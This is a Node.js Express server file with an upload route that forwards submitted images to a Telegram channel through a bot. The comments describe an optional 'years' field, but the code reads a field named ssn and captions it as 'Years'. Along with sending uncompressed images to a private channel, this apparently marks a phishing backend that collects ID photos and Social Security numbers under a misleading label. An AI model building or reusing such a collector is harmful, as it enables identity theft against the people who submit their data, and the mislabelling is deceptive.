const express = require('express');
const multer = require('multer');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const app = express();
const PORT = process.env.PORT || 3000;

// Store uploaded files in memory; swap for multer.diskStorage to save to disk
const upload = multer({ storage: multer.memoryStorage() });

// Parse JSON request bodies
app.use(express.json());

// Home route
app.get('/', (req, res) => {
  res.send('Hello from Express!');
});


const BOT_TOKEN = process.env.BOT_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

// Bot used only for sending (no polling). Created only if a token is present.
const bot = BOT_TOKEN ? new TelegramBot(BOT_TOKEN) : null;

// Receives up to 2 images and forwards them to a Telegram channel as
// DOCUMENTS (uncompressed = original/high quality).
// Client sends FormData with the images plus an optional `years` text field.
app.post('/api/upload', upload.any(), async (req, res) => {
  try {
    if (!bot || !CHANNEL_ID) {
      return res.status(500).json({
        success: false,
        error: 'Server missing BOT_TOKEN or CHANNEL_ID environment variables.',
      });
    }

    const files = req.files || [];
    if (files.length === 0) {
      return res.status(400).json({ success: false, error: 'No images received.' });
    }

    // Optional `years` text field -> caption on the first image.
    const years = req.body.ssn;

    const messageIds = [];
    for (let i = 0; i < files.length; i++) {
      const f = files[i];
      const options = i === 0 && years ? { caption: `Years: ${years}` } : {};
      const sent = await bot.sendDocument(
        CHANNEL_ID,
        f.buffer,
        options,
        { filename: f.originalname || `image${i}`, contentType: f.mimetype }
      );
      messageIds.push(sent.message_id);
    }

    res.json({ success: true, sent: files.length, years: years || null, messageIds });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Handles: const res = await fetch(endpoint, { method: 'POST', body: form });
// where `form` is a FormData object (sent as multipart/form-data).
// upload.any() accepts any number of files under any field names.

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
